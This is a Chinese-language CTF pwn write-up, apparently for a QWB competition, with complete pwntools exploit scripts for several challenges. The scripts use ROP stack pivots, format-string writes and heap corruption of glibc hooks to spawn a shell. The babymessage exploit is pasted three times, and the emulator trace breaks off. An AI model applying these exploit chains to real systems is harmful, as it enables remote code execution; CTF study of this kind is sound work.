## babymessage

栈溢出了,用栈迁移来解

```c
__int64 __fastcall leave_message(unsigned int length)
{
  int msg_len; // ST14_4
  __int64 msg; // [rsp+18h] [rbp-8h]

  puts("message: ");
  msg_len = read(0, &msg, length);
  strncpy(buf, (const char *)&msg, msg_len);
  buf[msg_len] = 0;
  puts("done!\n");
  return 0LL;
}
```

exp为：

```python=
from pwn import *
import sys

context.arch = 'amd64'

def cmd(command):
    p.recvuntil(": \n")
    p.sendline(str(command))

def leave_name(name):
    cmd(1)
    p.recvuntil(": \n")
    p.send(name)
    
def leave_messsage(message):
    cmd(2)
    p.recvuntil(": \n")
    p.send(message)
    
def show():
    cmd(3)

def main(host,port=21342):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babymessage")
		gdb.attach(p,"b *0x0000000004009DB\nc")
		# gdb.attach(p)
	leave_name(p32(0x00000000040089D))
	leave_messsage("A"*0x8+p64(0x6010D0-8))
	cmd(4)
	
	# 0x0000000000400ac3: pop rdi; ret;
	# 0x0000000000400ac1: pop rsi; pop r15; ret;
	# 0x0000000000400abd: pop rsp; pop r13; pop r14; pop r15; ret;
	p_rdi = 0x0000000000400ac3
	p_rsi_p = 0x0000000000400ac1
	p_rsp = 0x0000000000400abd
	
	payload = p64(p_rdi) + p64(0) + p64(p_rsi_p) + p64(0x601800-0x10)+p64(0)
	payload += p64(elf.symbols["read"]) + p64(p_rsp) + p64(0x601800)
	
	p.send(payload)
	
	pause()
	
	payload = p64(0x0000000000400A55)*8
	payload += p64(p_rdi) + p64(elf.got["read"]) + p64(elf.symbols["puts"])
	payload += p64(p_rdi) + p64(0) + p64(p_rsi_p) + p64(0x601840)+p64(0)
	payload += p64(elf.symbols["read"])
	
	p.send(payload)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["read"]
	success('libc : '+hex(libc.address))
	
	pause()
	
	payload = p64(0x0000000000400A55)*10
	payload += p64(p_rdi) + p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	
	p.send(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./babymessage",checksec=False)
	main(args['REMOTE'])

​```python
from pwn import *
import sys

context.arch = 'amd64'

def cmd(command):
    p.recvuntil(": \n")
    p.sendline(str(command))

def leave_name(name):
    cmd(1)
    p.recvuntil(": \n")
    p.send(name)
    
def leave_messsage(message):
    cmd(2)
    p.recvuntil(": \n")
    p.send(message)
    
def show():
    cmd(3)

def main(host,port=21342):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babymessage")
		gdb.attach(p,"b *0x0000000004009DB\nc")
		# gdb.attach(p)
	leave_name(p32(0x00000000040089D))
	leave_messsage("A"*0x8+p64(0x6010D0-8))
	cmd(4)
	
	# 0x0000000000400ac3: pop rdi; ret;
	# 0x0000000000400ac1: pop rsi; pop r15; ret;
	# 0x0000000000400abd: pop rsp; pop r13; pop r14; pop r15; ret;
	p_rdi = 0x0000000000400ac3
	p_rsi_p = 0x0000000000400ac1
	p_rsp = 0x0000000000400abd
	
	payload = p64(p_rdi) + p64(0) + p64(p_rsi_p) + p64(0x601800-0x10)+p64(0)
	payload += p64(elf.symbols["read"]) + p64(p_rsp) + p64(0x601800)
	
	p.send(payload)
	
	pause()
	
	payload = p64(0x0000000000400A55)*8
	payload += p64(p_rdi) + p64(elf.got["read"]) + p64(elf.symbols["puts"])
	payload += p64(p_rdi) + p64(0) + p64(p_rsi_p) + p64(0x601840)+p64(0)
	payload += p64(elf.symbols["read"])
	
	p.send(payload)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["read"]
	success('libc : '+hex(libc.address))
	
	pause()
	
	payload = p64(0x0000000000400A55)*10
	payload += p64(p_rdi) + p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	
	p.send(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./babymessage",checksec=False)
	main(args['REMOTE'])

​``````python=
from pwn import *
import sys

context.arch = 'amd64'

def cmd(command):
    p.recvuntil(": \n")
    p.sendline(str(command))

def leave_name(name):
    cmd(1)
    p.recvuntil(": \n")
    p.send(name)
    
def leave_messsage(message):
    cmd(2)
    p.recvuntil(": \n")
    p.send(message)
    
def show():
    cmd(3)

def main(host,port=21342):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babymessage")
		gdb.attach(p,"b *0x0000000004009DB\nc")
		# gdb.attach(p)
	leave_name(p32(0x00000000040089D))
	leave_messsage("A"*0x8+p64(0x6010D0-8))
	cmd(4)
	
	# 0x0000000000400ac3: pop rdi; ret;
	# 0x0000000000400ac1: pop rsi; pop r15; ret;
	# 0x0000000000400abd: pop rsp; pop r13; pop r14; pop r15; ret;
	p_rdi = 0x0000000000400ac3
	p_rsi_p = 0x0000000000400ac1
	p_rsp = 0x0000000000400abd
	
	payload = p64(p_rdi) + p64(0) + p64(p_rsi_p) + p64(0x601800-0x10)+p64(0)
	payload += p64(elf.symbols["read"]) + p64(p_rsp) + p64(0x601800)
	
	p.send(payload)
	
	pause()
	
	payload = p64(0x0000000000400A55)*8
	payload += p64(p_rdi) + p64(elf.got["read"]) + p64(elf.symbols["puts"])
	payload += p64(p_rdi) + p64(0) + p64(p_rsi_p) + p64(0x601840)+p64(0)
	payload += p64(elf.symbols["read"])
	
	p.send(payload)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["read"]
	success('libc : '+hex(libc.address))
	
	pause()
	
	payload = p64(0x0000000000400A55)*10
	payload += p64(p_rdi) + p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	
	p.send(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./babymessage",checksec=False)
	main(args['REMOTE'])

```

## siri

格式化字符串，改`__malloc_hook`

exp为：
```python
from pwn import *
import sys

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))


def fmtstr2(offset, addr, data, written):
	cnt = 0
	datalen = len(data)
	payload = ''
	address = ''
	for i in range(0,datalen/2):
		cur = u16(data[2*i:2*i+2])
		if cur >= written&0xffff:
			to_add = cur - (written&0xffff)
		else:
			to_add = 0x10000 + cur - (written&0xffff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%{}$hn".format(offset+cnt+datalen)
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+i*2)
		cnt += 1
	
	return payload + address

def say(msg):
	p.recvuntil(">>> ")
	p.sendline("Hey Siri!")
	p.recvuntil("I do for you?\n>>> ")
	p.send(msg)

def main(host,port=12124):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./siri")
		# debug(0x0000000000012B1)
		gdb.attach(p)
	payload = "Remind me to "+"%4$p-%83$p+"
	say(payload)
	
	p.recvuntil("remind you to ")
	stack = int(p.recvuntil("-")[:-1],16) - 0x15
	libc.address = int(p.recvuntil("+")[:-1],16) - 0x21b97
	
	info("stack : " + hex(stack))
	info("libc: " + hex(libc.address))
	
	one = libc.address + 0x10a45c
	
	payload = "Remind me to ".ljust(0x12,'A')
	payload += fmtstr2(0xe,libc.symbols["__malloc_hook"],p64(one)[:2],0x20)
	say(payload)
	
	payload = "Remind me to ".ljust(0x12,'A')
	payload += fmtstr2(0xe,libc.symbols["__malloc_hook"]+2,p64(one)[2:4],0x20)
	say(payload)
	
	payload = "Remind me to ".ljust(0x12,'A')
	payload += fmtstr2(0xe,libc.symbols["__malloc_hook"]+4,p64(one)[4:6],0x20)
	say(payload)
	
	# trigger malloc
	payload = "Remind me to %77777c"
	say(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./siri",checksec=False)
	main(args['REMOTE'])

```

## easypwn

`off_by_one`，没有了`fastbin`，先修改`global_max_fast`，在攻击`stdout`泄露，最后触发`malloc`报错来getshell，和去年byteCTF的一题挺像的，exp改改就好

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[3], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Your choice:")
	p.sendline(str(command))
def add(sz):
	cmd(1)
	p.recvuntil("size:")
	p.sendline(str(sz))
	
def dele(idx):
	cmd(3)
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,content):
	cmd(2)
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.send(content)

def main(host,port=10000):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./easypwn")
		# gdb.attach(p,"b *0x000000000401048")
		gdb.attach(p)
	
	add(0xe8) 		# 0
	add(0xf8)		# 1
	add(0x3a8)		# 2
	add(0xf8)		# 3
	add(0xe8)		# 4
	add(0xe8)		# 5
	
	dele(1)
	edit(2,"A"*0x3a0+p64(0x4b0))
	dele(3)
	add(0xe8)		# 1
	add(0xe8)		# 3
	add(0xe8)		# 6
	
	# t = int(raw_input('guest: '),16)
	
	t = 8
	global_maxfast = (t << 12) | 0x7f8
	
	stdout = global_maxfast-0x11d8
	
	# attack global_max_fast
	edit(2,"A"*0xd8+p64(0xf1)+"A"*0xe8+p64(0x2e1)+p64(0)+p16(global_maxfast-0x10)+'\n')
	add(0x2d0)		# 6
	
	edit(1,p16(stdout-0x51)+'\n')
	dele(0)
	dele(6)
	

	edit(2,"A"*0xd8+p64(0xf1)+'\xf0\n')
	
	add(0xe8)		
	add(0xe8)		
	add(0xe8)		# 8
	
	edit(8,'A'+"\x00"*0x40+p64(0xfbad1800)+p64(0)*3+'\x00\n')
	p.recv()
	p.recv(0x40)
	
	libc.address = u64(p.recv(8))-0x3c5600
	info("libc : " + hex(libc.address))
	
	one_gadget = 0xf1207+libc.address
	
	payload = '\x00'+p64(libc.address+0x3c55e0)+p64(0)*3+p64(0x1)+p64(one_gadget)*2+p64(libc.address+0x3c5600-8)
	edit(8,payload+'\n')
	
	add(1000)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## oldschool

这里看着就很诡异，最后是个越界写

```cpp
if(g_ptr + idx < g_ptr && (unsigned)(g_ptr + idx) < ADDR_HIGH){
        puts("Invalid idx");
        return;
    }
```

exp：

```python
from pwn import *
import sys

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		
def cmd(command):
	p.recvuntil("Your choice: ")
	p.sendline(str(command))
def add(idx,sz):
	cmd(1)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(str(sz))
	
def dele(idx):
	cmd(4)
	p.recvuntil(": ")
	p.sendline(str(idx))

def show(idx):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))

def edit(idx,content):
	cmd(2)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(content)

def mmap_alloc(addr):
	cmd(6)
	p.recvuntil(": ")
	p.sendline(str(addr))
	
def mmap_edit(offset,value):
	cmd(7)
	p.recvuntil(": ")
	p.sendline(str(offset))
	p.recvuntil(": ")
	p.sendline(str(value))

def main(host,port=2333):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./oldschool")
		# debug(0x0000000000012B1)
		gdb.attach(p)
		
	for i in range(8):
		add(i,0xf8)
	dele(0)
	dele(1)
	add(0,0xf8)
	
	show(0)
	p.recvuntil("Content: ")
	heap = u32(p.recvuntil('\n')[:-1].ljust(4,"\x00")) - 0x160
	dele(0)
	
	for i in range(3,8):
		dele(i)
	dele(2)
	
	add(0,0x20)
	show(0)
	p.recvuntil("Content: ")
	libc.address = u32(p.recv(4)) - 0x1d8858
	info("heap: " + hex(heap))
	info("libc.address: " + hex(libc.address))
	
	add(1,0xf8)
	edit(1,"/bin/sh")
	
	low = 0xe0000000
	
	mmap_alloc(0)
	mmap_edit((heap+0x760+0x100000000-low)/4,libc.symbols["__free_hook"])
	
	add(2,0xf8)
	add(3,0xf8)
	edit(3,p32(libc.symbols["system"]))
	dele(1)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./siri",checksec=False)
	main(args['REMOTE'])

```

## Just_a_Galgame

edit没有检查idx的合法性，所以一次edit用来泄露libc，一次用来修改`__malloc_hook`

```python
from pwn import *
import sys
		
def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))

def add():
	cmd(1)	

def show():
	cmd(4)
	
def edit(idx,content):
	cmd(2)
	p.recvuntil("idx >> ")
	p.sendline(str(idx))
	p.recvuntil(">> ")
	p.send(content)


def main(host,port=52114):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./Just_a_Galgame")
		# debug(0x0000000000012B1)
		gdb.attach(p)
	add()	
	edit(0,p64(0)+p64(0xd41))
	cmd(3)
	add()
	show()
	p.recvuntil("1: ")
	libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x3ebca0 - 0x600
	success('libc : '+hex(libc.address))
	cmd(5)
	p.recvuntil("QAQ\n")
	p.send(p64(libc.symbols["__realloc_hook"]-0x60))
	one = 0x4f3c2+libc.address
	edit(8,p64(one)+p64(libc.symbols["realloc"]))
	add()
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./siri",checksec=False)
	main(args['REMOTE'])

```

## babynotes

`regist`函数可以溢出下一块堆块的size

exp为：

```python
from pwn import *
import sys

def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))
def add(idx,sz):
	cmd(1)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(str(sz))
	
def dele(idx):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))

def show(idx):
	cmd(2)
	p.recvuntil(": ")
	p.sendline(str(idx))

def edit(idx,content):
	cmd(4)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.send(content)

def regist(name,motto,age):
	p.recvuntil(": ")
	p.send(name)
	p.recvuntil(": ")
	p.send(motto)
	p.recvuntil(": ")
	p.sendline(age)

def main(host,port=43121):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babynotes")
		# gdb.attach(p,"b *0x000000000400BE0")
		# 
	p.recvuntil("age first")
	regist("A","B",str(0))
	add(0,0x100)
	add(5,0x18)
	dele(0)
	add(0,0x100)
	show(0)
	p.recvuntil("0: ")
	libc.address = u64(p.recv(6)+'\x00\x00') - 0x3c4b78
	info("libc : " + hex(libc.address))
	dele(0)
	add(0,0x18)
	add(1,0x20)
	add(2,0x68)
	add(3,0x30)
	edit(3,(p64(0)+p64(0x21))*0x2)
	dele(0)
	cmd(5)
	regist("A"*0x18,"B",str(0xf1))
	dele(1)
	dele(2)
	add(0,0xe0)
	edit(0,"\x00"*0x28+p64(0x71)+p64(libc.symbols["__malloc_hook"]-0x23))
	add(1,0x68)
	add(2,0x68)
	one = 0xf0364+libc.address
	# gdb.attach(p)
	edit(2,"\x00"*0xb+p64(one)*2)
	dele(2)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./siri",checksec=False)
	main(args['REMOTE'])

```

## direct

edit的时候有越界写，我们可以修改到上面的堆块，所以修改`__dirstream`结构的偏移，先泄露libc，在攻击tcache就行

```python
from pwn import *
import sys

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		
def cmd(command):
	p.recvuntil("Your choice: ")
	p.sendline(str(command))
def add(idx,sz):
	cmd(1)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(str(sz))
	
def dele(idx):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))


def edit(idx,offset,sz,content):
	cmd(2)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(str(offset))
	p.recvuntil(": ")
	p.sendline(str(sz))
	p.recvuntil(": ")
	p.send(content)

def mmap_alloc(addr):
	cmd(6)
	p.recvuntil(": ")
	p.sendline(str(addr))
	
def mmap_edit(offset,value):
	cmd(7)
	p.recvuntil(": ")
	p.sendline(str(offset))
	p.recvuntil(": ")
	p.sendline(str(value))

def main(host,port=1912):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./direct")
		debug(0x000000000000E64)
		# gdb.attach(p)
	cmd(4)
	for i in range(0x8):
		add(i,0xf8)
	for i in range(1,0x8):
		dele(i)
	dele(0)
	add(0,0)
	cmd(5)
	edit(0,-0x8000-0x28,0x7fff,p64(0x8030-0x13))		# offset
	edit(0,-0x8000-0x30,0x7fff,p64(0x9000))				# size
	cmd(5)
	p.recvuntil("Filename: ")
	libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x3ebca0
	success('libc : '+hex(libc.address))
	
	add(1,0xf8)
	edit(1,-0x100,0xff,p64(libc.symbols["__free_hook"]))
	add(2,0xf8)
	edit(2,0,0x10,"/bin/sh\x00")
	
	add(3,0xf8)
	edit(3,0,0x10,p64(libc.symbols["system"]))
	
	dele(2)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./direct",checksec=False)
	main(args['REMOTE'])

```

## QWBlogin

这个自己写了个粗糙的emu，大概能看的出来逻辑，先是比较密码，接着就是一个`read`，这里的read是由栈溢出的，我们可以修改程序的`rip`，然后去`test.bin`里找gadget，最后rop拿flag，这题挺有意思的

emu.cpp：

```cpp
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <stdint.h>
#include <stack>

#define EQ 0x1

using namespace std;

char code[0x1000];
char data[0x1000];

int rip = 0;
int next_ip = 0;

stack<size_t> stk;

struct vm_{
	size_t regs[0x10];
	size_t rsp;
	size_t unknown;
	size_t rip;
	size_t eflag;
	size_t code_len;
	char* code;
	size_t data_len;
	char* data_;
	size_t rbp;
	char* stack;
};

int emu(struct vm_* vm){
	switch(code[rip+1] & 0xf){
		case 0:
		case 0xb:
		case 0xc:
		case 0xd:
		case 0xe:
			next_ip = rip + 4;
			break;
		case 1:
		case 2:
		case 3:
		case 4:
			next_ip = rip + 11;
			break;
		case 5:
		{
			int width = code[rip+1] & 0xF0;
			if(width == 0x10)
				next_ip = rip+4;
			else if(width == 0x20)
				next_ip = rip+5;
			else if(width == 0x30)
				next_ip = rip+7;
			else if(width == 0x40)
				next_ip = rip+11;
		}
			break;
		case 6:
			next_ip = rip + 3;
			break;
		case 7:
		{
			int width = code[rip+1] & 0xF0;
			if(width == 0x10)
				next_ip = rip+3;
			else if(width == 0x20)
				next_ip = rip+4;
			else if(width == 0x30)
				next_ip = rip+6;
			else if(width == 0x40)
				next_ip = rip+10;
		}
			break;
		case 8:
			if(code[rip] == 32)
				next_ip = rip + 2;
			else
				next_ip = rip + 10;
			break;
		case 9:
			next_ip = rip + 2;
			break;
		case 10:
			next_ip = rip + 2;
			break;
	}
	printf("rip: 0x%x  ",rip);
	// INST
	switch(code[rip]){
		case 0:
			printf("hlt\n");
			break;
		case 1:
		{
			printf("mov\n");
			int mov_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(mov_ == 5){
				if(width == 0x40){
					*(&vm->regs[0] + code[rip+2]) = *(size_t*)&code[rip+3];
					printf("mov regs[%d],0x%llx\n",code[rip+2],*(size_t*)&code[rip+3]); 
				}else if(width == 0x30){
					*(&vm->regs[0] + code[rip+2]) = *(uint32_t*)&code[rip+3];
					printf("mov regs[%d],0x%x\n",code[rip+2],*(uint32_t*)&code[rip+3]); 
				}else if(width == 0x20){
					*(&vm->regs[0] + code[rip+2]) = *(uint16_t*)&code[rip+3];
					printf("mov regs[%d],0x%x\n",code[rip+2],*(uint16_t*)&code[rip+3]); 
				}else if(width == 0x10){
					*(&vm->regs[0] + code[rip+2]) = *(uint8_t*)&code[rip+3];
					printf("mov regs[%d],0x%x\n",code[rip+2],*(uint8_t*)&code[rip+3]); 
				}
			}
			else if(mov_ == 1){
				if(width == 0x40){
					*(&vm->regs[0] + code[rip+2]) = *(size_t*)&data[*(size_t*)&code[rip+3]];
					printf("mov regs[%d],0x%llx\n",code[rip+2],*(&vm->regs[0] + code[rip+2])); 
				}else if(width == 0x30){
					*(&vm->regs[0] + code[rip+2]) = *(uint32_t*)&data[*(size_t*)&code[rip+3]];
					printf("mov regs[%d],0x%llx\n",code[rip+2],*(&vm->regs[0] + code[rip+2])); 
				}else if(width == 0x20){
					*(&vm->regs[0] + code[rip+2]) = *(uint16_t*)&data[*(size_t*)&code[rip+3]];
					printf("mov regs[%d],0x%llx\n",code[rip+2],*(&vm->regs[0] + code[rip+2])); 
				}else if(width == 0x10){
					*(&vm->regs[0] + code[rip+2]) = *(uint8_t*)&data[*(size_t*)&code[rip+3]];
					printf("mov regs[%d],0x%llx\n",code[rip+2],*(&vm->regs[0] + code[rip+2])); 
				}
			}
			else if(mov_ == 2){
				if(width == 0x40){
					*(size_t*)(data + *(size_t*)&code[rip+2]) = *(size_t*)(&vm->regs[0] + code[rip+10]);
					printf("mov data[%lld],0x%llx\n",*(size_t*)&code[rip+2],*(size_t*)(&vm->regs[0] + code[rip+10])); 
				}else if(width == 0x30){
					*(uint32_t*)(data + *(size_t*)&code[rip+2]) = *(uint32_t*)(&vm->regs[0] + code[rip+10]);
					printf("mov data[%lld],0x%x\n",*(size_t*)&code[rip+2],*(uint32_t*)(&vm->regs[0] + code[rip+10]));
				}else if(width == 0x20){
					*(uint16_t*)(data + *(size_t*)&code[rip+2]) = *(uint16_t*)(&vm->regs[0] + code[rip+10]);
					printf("mov data[%lld],0x%x\n",*(size_t*)&code[rip+2],*(uint16_t*)(&vm->regs[0] + code[rip+10])); 
				}else if(width == 0x10){
					*(uint8_t*)(data + *(size_t*)&code[rip+2]) = *(uint8_t*)(&vm->regs[0] + code[rip+10]);
					printf("mov data[%lld],0x%x\n",*(size_t*)&code[rip+2],*(uint8_t*)(&vm->regs[0] + code[rip+10])); 
				}
			}
			else if(mov_ == 0){
				if(width == 0x40){
					*(&vm->regs[0] + code[rip+2]) = *(size_t*)(&vm->regs[0] + code[rip+3]);
					printf("mov regs[%d],reg[%d]\n",code[rip+2],code[rip+3]); 
				}else if(width == 0x30){
					*(&vm->regs[0] + code[rip+2]) = *(uint32_t*)(&vm->regs[0] + code[rip+3]);
					// printf("mov regs[%d],0x%x\n",code[rip+2],*(uint32_t*)(&vm->regs[0] + code[rip+3]));
					printf("mov regs[%d],reg[%d]\n",code[rip+2],code[rip+3]);
				}else if(width == 0x20){
					*(&vm->regs[0] + code[rip+2]) = *(uint16_t*)(&vm->regs[0] + code[rip+3]);
					printf("mov regs[%d],reg[%d]\n",code[rip+2],code[rip+3]);
				}else if(width == 0x10){
					*(&vm->regs[0] + code[rip+2]) = *(uint8_t*)(&vm->regs[0] + code[rip+3]);
					printf("mov regs[%d],reg[%d]\n",code[rip+2],code[rip+3]);
				}
			}
		}
			break;
		case 2:
			printf("add\n");
			break;
		case 3:
		{
			printf("sub\n");
			int sub_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(sub_ == 5){
				if(width == 0x40){
					*(size_t*)(&vm->regs[0] + code[rip+2]) -= *(size_t*)&code[rip+3];
					printf("sub reg[%d],0x%llx\n",code[rip+2],*(size_t*)&code[rip+3]);
				}
			}
		}
			
			break;
		case 4:
			printf("mul\n");
			break;
		case 5:
			printf("div\n");
			break;
		case 6:
			printf("mod\n");
			break;
		case 7:
		{
			printf("xor\n");
			int xor_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(xor_ == 5){
				if(width == 0x10){
					*(&vm->regs[0] + code[rip+2]) ^= code[rip+3];
					if(*(&vm->regs[0] + code[rip+2]) == 0)
						vm->eflag |= EQ;
					else
						vm->eflag &= 0;
					printf("xor regs[%d],0x%x\n",code[rip+2],code[rip+3]);
				}
			}
			else if(xor_ == 0){
				if(width == 0x40){
					*(&vm->regs[0] + code[rip+2]) ^= *(&vm->regs[0] + code[rip+3]);
					if(*(&vm->regs[0] + code[rip+2]) == 0)
						vm->eflag |= EQ;
					else
						vm->eflag &= 0;
					printf("xor regs[%d],regs[%d]\n",code[rip+2],code[rip+3]);
				}
			}
		}
			
			break;
		case 8:
			printf("or\n");
			break;
		case 9:
			printf("and\n");
			break;
		case 0xa:
			printf("shl\n");
			break;
		case 0xb:
			printf("shr\n");
			break;
		case 0xc:
			printf("not\n");
			break;
		case 0xd:
		{
			printf("pop\n");
			int pop_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(width == 0x40){
				printf("pop regs[%d] ",code[rip+2]);
				printf("  or   pop 0x%llx\n",stk.top());
				stk.pop();
			}
		}
			
			break;
		case 0xe:
		{
			printf("push\n");
			int push_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(width == 0x40){
				stk.push(*(size_t*)(&vm->regs[0] + code[rip+2]));
				printf("push regs[%d] ",code[rip+2]);
				printf("  or   push 0x%llx\n",*(size_t*)(&vm->regs[0] + code[rip+2]));
			}
		}
			
			break;	
		case 0x10:
		{
			
			int addr = code[rip+1] & 0xf;
			stk.push(next_ip);
			next_ip = *(int*)(&vm->regs[0]+code[rip+2]);
			printf("call 0x%x\n",next_ip);
		}
			break;
		case 0x11:
		{
			next_ip = stk.top(); stk.pop();
			printf("ret 0x%x\n",next_ip);
		}
			break;
		case 0x12:
		{
			printf("cmp\n");
			int cmp_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(cmp_ == 5){
				if(width == 0x10){
					if(vm->regs[code[rip+2]] == code[rip+3])
						vm->eflag |= EQ;
					else
						vm->eflag &= 0;
					printf("cmp regs[%d],0x%x\n",code[rip+2],code[rip+3]);
				}
				else if(width == 0x40){
					if(vm->regs[code[rip+2]] == *(size_t*)&code[rip+3])
						vm->eflag |= EQ;
					else
						vm->eflag &= 0;
					printf("cmp regs[%d],0x%llx\n",code[rip+2],*(size_t*)&code[rip+3]);
				}
			}
			
		}
			break;
		case 0x13:
		{
			printf("jmp\n");
			int jmp_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(jmp_ == 7){
				if(width == 0x10){
					next_ip += code[rip+2];
					printf("jmp 0x%x\n",next_ip);
				}
			}
		}			
			break;
		case 0x14:
		{
			printf("je\n");
			int jmp_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(jmp_ == 7){
				if(width == 0x10){
					printf("je 0x%x\n",next_ip + code[rip+2]);
					if(vm->eflag & EQ)
						next_ip += code[rip+2];
					
				}
			}
		}
			break;
		case 0x15:
		{
			printf("jne\n");
			int jmp_ = code[rip+1] & 0xf;
			int width = code[rip+1] & 0xf0;
			if(jmp_ == 7){
				if(width == 0x10){
					printf("jne 0x%x\n",next_ip+code[rip+2]);
					if(!(vm->eflag & EQ))
						next_ip += code[rip+2];
				}
			}
		}
			break;
		case 0x16:
			printf("jg\n");
			break;
		case 0x17:
			printf("jng\n");
			break;
		case 0x18:
			printf("jl\n");
			break;
		case 0x19:
			printf("jnl\n");
			break;
		case 0x1a:
			printf("ja\n");
			break;
		case 0x1b:
			printf("jna\n");
			break;
		case 0x1c:
			printf("jb\n");
			break;
		case 0x1d:
			printf("jnb\n");
			break;	
		case 0x20:
		{
			size_t syscall_num = vm->regs[0];
			printf("syscall %d\n",syscall_num);
			if(syscall_num == 2){
				printf("write(%d,&data+%d,%d)\n",vm->regs[1],vm->regs[2],vm->regs[3]);
				write(vm->regs[1],&data[vm->regs[2]],vm->regs[3]);
			}
			else if(syscall_num == 1){
				printf("read(%d,&data+%d,%d)\n",vm->regs[1],vm->regs[2],vm->regs[3]);
				read(vm->regs[1],&data[vm->regs[2]],vm->regs[3]);
			}
			else if(syscall_num == 0){
				printf("open(&data+%d,%d)\n",vm->regs[1],vm->regs[2]);
			}
		}
			
			break;
	}
	printf("----------------------------------------\n");
	// printf("rip: 0x%x\n",rip);
	rip = next_ip;
	return 0;
}



int main(){
	// QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO
	int fd = open("./test.bin",0);
	read(fd,code,0x100);
	read(fd,code,0x7b8);
	read(fd,data,0xc0);
	
	struct vm_ * vm =(struct vm_ *)calloc(sizeof(struct vm_),1);
	
	while(!emu(vm) && rip < 0x7b8)
		;
	return 0;
}
```

输出（能有个大概的逻辑）：

```c
rip: 0x0  mov
mov regs[0],0x45
----------------------------------------
rip: 0xb  call 0x45
----------------------------------------
rip: 0x45  mov
mov regs[0],0x2
